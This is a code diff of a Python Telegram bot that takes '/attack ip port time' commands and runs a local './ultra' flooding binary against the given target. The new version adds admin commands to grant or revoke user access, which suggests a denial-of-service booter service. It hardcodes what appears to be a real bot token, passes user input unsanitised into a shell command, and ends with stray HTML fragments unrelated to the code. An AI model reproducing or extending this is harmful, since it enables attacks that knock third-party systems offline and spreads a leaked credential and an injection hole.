@@ -1,77 +1,71 @@
-import os
 import asyncio
 from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
-from telegram.error import TelegramError
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-TELEGRAM_BOT_TOKEN = '977335513:AAEfuDfd2cRsIoLS6oPmOuYfJQpoJ2WD-Lw'
-ALLOWED_USER_ID = 6135948216
-bot_access_free = True  
+TOKEN = "977335513:AAEfuDfd2cRsIoLS6oPmOuYfJQpoJ2WD-Lw"
+ADMIN_ID = 6135948216
 
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration>*\n"
-        "*Let the war begin! ⚔️💥*"
+# simple user list (no DB)
+allowed_users = set()
+
+# START
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🔥 Bot Active\nUse /attack ip port time")
+
+# ADD USER (admin)
+async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    
+    user_id = int(context.args[0])
+    allowed_users.add(user_id)
+
+    await update.message.reply_text(f"✅ User {user_id} added")
+
+# REMOVE USER
+async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    
+    user_id = int(context.args[0])
+    allowed_users.discard(user_id)
+
+    await update.message.reply_text(f"❌ User {user_id} removed")
+
+# ATTACK
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    if user_id not in allowed_users:
+        await update.message.reply_text("❌ Not allowed")
+        return
+
+    if len(context.args) != 3:
+        await update.message.reply_text("Use: /attack ip port time")
+        return
+
+    ip, port, duration = context.args
+
+    await update.message.reply_text(f"🚀 Attack Started\n{ip}:{port}")
+
+    process = await asyncio.create_subprocess_shell(
+        f"./ultra {ip} {port} {duration} 1200"
     )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-async def run_attack(chat_id, ip, port, duration, context):
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./ultra {ip} {port} {duration} 800",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
+    await process.communicate()
 
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+    await update.message.reply_text("✅ Attack Done")
 
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
-
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user issuing the command
-
-    # Check if the user is allowed to use the bot
-    if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
-        return
-
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
-        return
-
-    ip, port, duration = args
-    await context.bot.send_message(chat_id=chat_id, text=( 
-        f"*⚔️ Attack Launched! ⚔️*\n"
-        f"*🎯 Target: {ip}:{port}*\n"
-        f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Let the battlefield ignite! 💥*"
-    ), parse_mode='Markdown')
-
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
-
+# MAIN
 def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("attack", attack))
+    app = Application.builder().token(TOKEN).build()
 
-    application.run_polling()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("add", add))
+    app.add_handler(CommandHandler("remove", remove))
+    app.add_handler(CommandHandler("attack", attack))
 
-if __name__ == '__main__':
+    app.run_polling()
+
+if __name__ == "__main__":
     main()
-
-                # Optional: simulate that the warning can be shown again? Not needed. Optional: simulate that the warning can be shown again? Not needed.
-    </script>
-</body>
-</html>
